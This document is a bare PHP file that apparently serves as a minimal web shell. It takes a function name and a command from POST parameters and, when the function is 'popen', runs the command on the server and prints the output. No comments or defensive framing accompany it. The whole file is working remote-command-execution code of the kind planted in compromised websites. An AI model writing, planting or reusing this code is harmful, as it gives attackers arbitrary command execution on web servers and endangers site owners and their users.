<?php
$execfunc = $_POST['func'];
    if ($execfunc=="popen") { 
        $pp = popen($_POST['command'], 'r'); 
        $read = fread($pp, 2096); 
        echo $read; 
        pclose($pp); 
    } 
?>